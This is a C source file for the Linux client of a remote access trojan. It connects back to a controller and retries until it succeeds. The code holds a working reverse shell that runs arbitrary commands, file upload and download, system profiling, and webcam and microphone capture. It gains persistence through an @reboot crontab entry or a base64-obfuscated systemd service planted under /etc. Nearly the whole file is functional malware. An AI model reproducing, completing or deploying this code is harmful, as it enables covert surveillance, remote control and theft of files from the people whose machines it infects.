#include <netinet/in.h>  
#include <stdio.h> 
#include <stdlib.h> 
#include <sys/socket.h> 
#include <sys/types.h> 
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <locale.h>
#include <stdbool.h>
#include <libgen.h>
#include <signal.h>
#include <sys/stat.h>
#include <netdb.h>
#include "../src/base64.c"
#include "../src/linux/sysInfoLin.c"
#include "../src/linux/webcamLin.c"
#include "../src/linux/audioRecord.c"


// Definiciones
#define SOCKBUFF 2048
#define CMDBUFF 4096

/*

  Creado por "an0mal1a"

       https://github.com/an0mal1a

*/

// Prototipos
char *IsElevated();
int mainLoop(int conn);
int excndSend(int conn, char* cmd);
int sendRawData(char *file, int conn);
int readNdSndFle(int conn, char *file);
void conection();
void ash(int conn);
void _chdir(int conn, char *instruct);
char* replaceFile(char* command, char* toReplace);
char* copySource(int conn, char *method);

char *IsElevated(){ 
    if (getuid()) {
        return "no";
    } else {
        return "yes";
    }
    return 0;

}

int excndSend(int conn, char* cmd){
    if (strstr(cmd, "exec") != NULL){
        char toReplace[] = "exec ";

        char *substr = strstr(cmd, toReplace);
        size_t remainingLength = strlen(substr + strlen(toReplace));
        memmove(cmd, substr + strlen(toReplace), remainingLength + 1);

        if (strstr(cmd, "cd") != NULL){
            _chdir(conn, cmd);
            return 0;
        } 
    }
    
    FILE *xx = NULL;
    char* path = NULL;
    size_t path_size = 0;
    
    char fullCmd[CMDBUFF] = "";
    snprintf(fullCmd, sizeof(fullCmd), "%s 2>&1", cmd);
    
    xx = popen(fullCmd, "r");
    if (xx == NULL){
        char error[100] = "Error executing command...";
        send(conn, error, sizeof(error), 0);
        return 1;
    }

    while (getline(&path, &path_size, xx) != -1){
        send(conn, path, strlen(path), 0);
    }

    free(path);
    sleep(0.5); 
    send(conn, "end\0", strlen("end\0"), 0); 
    pclose(xx);
    return 0;
    
} 

void _chdir(int conn, char *instruct) {
    char *directory = malloc(SOCKBUFF + 1);
    char *newDir = malloc(SOCKBUFF + 1);
    memset(directory, 0, SOCKBUFF + 1);
    memset(newDir, 0, SOCKBUFF + 1);

    if (strcmp(instruct, "cd") == 0) {
        getcwd(directory, SOCKBUFF);
        send(conn, directory, strlen(directory), 0);
        sleep(0.3); 
        send(conn, "end\0", strlen("end\0"), 0);
        return;
    }

    char toReplace[] = "cd ";

    char *substr = strstr(instruct, toReplace); 
    memmove(directory, substr + strlen(toReplace), strlen(substr + strlen(toReplace)) + 1);
    
    chdir(directory);
    getcwd(newDir, SOCKBUFF); 
    send(conn, newDir, SOCKBUFF, 0);
    
    sleep(0.3);  
    send(conn, "end\0", strlen("end\0"), 0);
    
    free(directory);
    free(newDir);
}


void ash(int conn){
    char cmd[CMDBUFF] = "";

    while (true){
        recv(conn, cmd, sizeof(cmd), 0); 
        if (strcmp(cmd, "q") == 0){
            memset(cmd, 0, SOCKBUFF);
            break;
        } else if (strlen(cmd) == 0)
        {
            continue;
        } else if(strstr(cmd, "cd") != NULL){
            _chdir(conn, cmd);
            memset(cmd, 0, SOCKBUFF);
        } else {
            excndSend(conn, cmd);
            // Limpiar comando recibido
            memset(cmd, 0, SOCKBUFF);
        }
    }
    sleep(0.5); 
    return;
}

int writeAndDecodeData(char *data, char *file){  
    char *base = basename(file);   
 
    FILE *fp;
    long input_size = strlen(data); 
    char* DecodedData = base64_decode(data, input_size, &input_size);  
    fp = fopen(base, "w");
    
    if (fp == NULL){ 
        return 1;
    }

    fprintf(fp ,"%s" ,DecodedData);
    fclose(fp);

    return 0;   
}


int uploadFunc(char* command, int conn) {
    // Encontrar nombre de base (NO RUTA COMPLETA)
    printf("\n\n%s", command);
    char *base = basename(replaceFile(command, "upload "));

    char fullBytesStr[100]; memset(fullBytesStr, 0, 100);
    recv(conn, fullBytesStr, 100, 0);
    long FullBytes = atoi(fullBytesStr);
    printf("\n\n%ld\n\n", FullBytes);

    FILE* fp;
    fp = fopen(base, "wb");

    unsigned char recvData[SOCKBUFF];
    size_t FullbytesRead = 0;
    size_t bytesRead = 0;

    while (FullBytes > FullbytesRead) {
        bytesRead = recv(conn, (char *)recvData, SOCKBUFF, 0);
        
        //if (strcmp((char *)recvData, "end\0") == 0)
        //    break;

        fwrite(recvData, 1, bytesRead, fp);
        //fwrite(base64_decode(recvData, bytesRead, &bytesRead), 1, bytesRead, fp);
        memset(recvData, 0, SOCKBUFF);
        FullbytesRead += bytesRead;
    }

    fclose(fp);

}

char* replaceFile(char* command, char* toReplace) {
    char* file = malloc(strlen(command) + 1); // Asigna memoria a 'file'

    char* substr = strstr(command, toReplace);
    size_t remainingLength = strlen(substr + strlen(toReplace));
    memmove(file, substr + strlen(toReplace), remainingLength + 1);
    file[remainingLength] = '\0';

    return file;
}

int readFile(int conn, char *instruct){
    char *filename = replaceFile(instruct, "download ");
    long fullBytes = get_file_size(filename);

    char fullBytesStr[100];
    snprintf(fullBytesStr, 100, "%ld", fullBytes);
    send(conn, fullBytesStr, strlen(fullBytesStr), 0);
    sleep(0.3);

    if (fullBytes == -1){
        send(conn, "-1", 2, 0);
        return 1;
    }

    FILE *fp;
    fp = fopen(filename, "rb");

    char readData[SOCKBUFF];
    long bytesRead = 0;

    while (true){
        if ((bytesRead = fread(readData, 1, 2047, fp)) <= 0)
            break;

        readData[bytesRead] = '\0';
        send(conn, (char *)readData, bytesRead, 0);
        memset(readData, 0, SOCKBUFF);
    }

    fclose(fp);
    sleep(0.5);
    //send(conn, "end\0", strlen("end\0"), 0); 
    return 0;

}

char* copySource(int conn, char *method){
    char* home = getenv("HOME");
    char* configPath = malloc(SOCKBUFF);
    char* servicePath = "/.config/Worker";
    char* lction = malloc(strlen(home) + strlen(servicePath) + 1);

    strcpy(lction, home);
    strcpy(configPath, home);
    strcat(lction, servicePath);
    strcat(configPath, "/.config");

    char path[SOCKBUFF];
    memset(path, 0, SOCKBUFF);

    ssize_t count = readlink("/proc/self/exe", path, SOCKBUFF);
    if (count == -1) {
        send(conn, "error", strlen("error"), 0);
        free(lction);  // Liberar la memoria asignada
        return NULL;
    }

    char command[SOCKBUFF];
    if (strcmp(method, "low") == 0){
        struct stat buffer;
        if (stat(configPath, &buffer) != 0) {
            mkdir(configPath, 0755); 
        }
        printf("\n\n");
        struct stat buffer1;
        if (stat(lction, &buffer1) != 0) {
            mkdir(lction, 0755); 
        }

        strcat(lction, "/worker");
        sprintf(command, "cp %s %s && chmod 755 %s", path, lction, lction);
    }
    
    else if (strcmp(method, "high") == 0){
        struct stat buffer3;
        if (stat("/etc/addOn/", &buffer3) != 0) {
            mkdir("/etc/addOn/", 0700); 
        }
        sprintf(command, "cp %s /etc/addOn/addOnBinary && chmod 755 /etc/addOn/addOnBinary", path);

    }
    
    system(command);
    
    if (strcmp(method, "high") == 0)
        return "/etc/addOn/addOnBinary";
    else 
        return lction;
}

int getPrstnc(int conn, char *method) {

    if (strcmp(method, "low") == 0) {
        char* path = copySource(conn, method);
        //printf("%s", path);
        if (path == NULL) {
            return 1;
        }

        char* cmd = malloc(SOCKBUFF);
        char* kwor = malloc(SOCKBUFF);

        snprintf(kwor, SOCKBUFF, "@reboot %s\n", path);
        snprintf(cmd, SOCKBUFF, "echo '%s' > /tmp/tmpajfeasc && crontab /tmp/tmpajfeasc && rm /tmp/tmpajfeasc", kwor);

        system(cmd);

        //printf("\n\n%s", cmd);

        send(conn, "exito\0", strlen("exito\0") + 1, 0);

        free(cmd);
        free(kwor);
        free(path);

    } else if (strcmp(method, "high") == 0) {
        

        if (strcmp(IsElevated(), "yes") == 0){
            char* path = copySource(conn, "high");  

            if (path == NULL) {
                send(conn, "error", strlen("error"), 0);
                return 1;
            }
            FILE *fp = fopen("/etc/systemd/system/addOn-xsession.service", "w");
            if (fp == NULL){
                send(conn, "error", strlen("error"), 0);
                return 1;
            }
            char * data = "CltVbml0XQpEZXNjcmlwdGlvbj1YLVNlc3Npb24tYWRkT24KQWZ0ZXI9bmV0d29yay50YXJnZXQKCltTZXJ2aWNlXQpFeGVjU3RhcnQ9L2V0Yy9hZGRPbi9hZGRPbkJpbmFyeQpSZXN0YXJ0PWFsd2F5cwoKW0luc3RhbGxdCldhbnRlZEJ5PWdyYXBoaWNhbC50YXJnZXQgCg==";
            long input_size = strlen(data); 
            fprintf(fp, "%s", base64_decode(data, input_size, &input_size));
            fclose(fp);


            data = "c3lzdGVtY3RsIGVuYWJsZSBhZGRPbi14c2Vzc2lvbi5zZXJ2aWNlICY+L2Rldi9udWxsCg==";
            input_size = strlen(data); 
            fprintf(fp, "%s", base64_decode(data, input_size, &input_size));
            system(base64_decode(data, input_size, &input_size));

            // Envía una respuesta al cliente
            send(conn, "exito", strlen("exito"), 0);
        }
        else {
            send(conn, "permissonError", strlen("permissonError"), 0);
            return 1;
        }
    }
    return 0;
}

int sendRawData(char *file, int conn){
    long fullBytes = get_file_size(file);

    if (fullBytes == -1){
        send(conn, "error", strlen("error"), 0);
        return 1;
    }

    char fullBytesStr[100];

    sprintf(fullBytesStr, "%ld\0", fullBytes);   
    send(conn, fullBytesStr, 100, 0);

    FILE *fp = fopen(file, "rb");
    

    long bytesRead = 0;
    char readData[2048];

    while ((bytesRead = fread(readData, 1, SOCKBUFF, fp)) > 0){
        readData[bytesRead] = '\0';
        send(conn, readData, bytesRead, 0);
        memset(readData, 0, 2048);
    }
    
    fclose(fp);
    sleep(0.4);
    
    //send(conn, "end\0", strlen("end\0"), 0); 
    
    remove(file);
    return 0;
}

int mainLoop(int conn){
    char instruct[SOCKBUFF];

    while (true){
        memset(instruct, 0, SOCKBUFF);
        recv(conn, instruct, sizeof(instruct), 0); 
        if (strcmp(instruct, "exit") == 0){
            close(conn); 
            return 0;
        }
        else if (strcmp(instruct, "exit -y") == 0){
            close(conn);
            exit(0);
        }
        else if (strcmp(instruct, "shell") == 0)    
            ash(conn); 
        
        else if (strstr(instruct, "download ") != NULL)
            readFile(conn, instruct);
        
        else if (strstr(instruct, "exec") != NULL){
            excndSend(conn, instruct);

        }
        else if (strstr(instruct, "upload") != NULL)
            uploadFunc(instruct, conn);
        
        else if (strcmp(instruct, "sysinfo") == 0){
            srtSysInfo(conn);
        
        } else if (strcmp(instruct, "lowpersistence") == 0){
            getPrstnc(conn, "low");          
            sleep(0.3);
        
        } else if (strcmp(instruct, "persistence") == 0){
            getPrstnc(conn, "high");          
            sleep(0.3);

        } else if(strcmp(instruct, "check") == 0){
            send(conn, IsElevated(), strlen(IsElevated()), 0);

        } else if (strcmp(instruct, "video") == 0){
            startWeb(conn);
            sleep(0.5);
            //send(conn, "ending\0", strlen("ending\0"), 0);
        
        } else if (strcmp(instruct, "record") == 0){
            char *filename = startRecord(conn);
            sendRawData(filename, conn);

        }else
            continue;
    }
    return 0;
}

void conection(){
    // Geberabanis el socket
    int conn = socket(AF_INET, SOCK_STREAM, 0);

    // Generamos estructura de datos 
    struct sockaddr_in cltAddr;
    
    cltAddr.sin_family = AF_INET;
    cltAddr.sin_port = htons(9000); // Especifcamos puerto 
    cltAddr.sin_addr.s_addr = inet_addr("127.0.0.1"); // Especificar DIRECCION IP

    int targetConnStatus 
        = connect(conn, (struct sockaddr*)&cltAddr, 
                    sizeof(cltAddr));

    if (targetConnStatus == -1) {
        sleep(10);
        conection();
        //printf("%s[!>] %sERROR...\n", YELLOW, RED);

    } else {
        mainLoop(conn);
        sleep(10);
        conection();
    }
}

int main(int argc, char const* argv[]){
    conection();
    return 0;

}
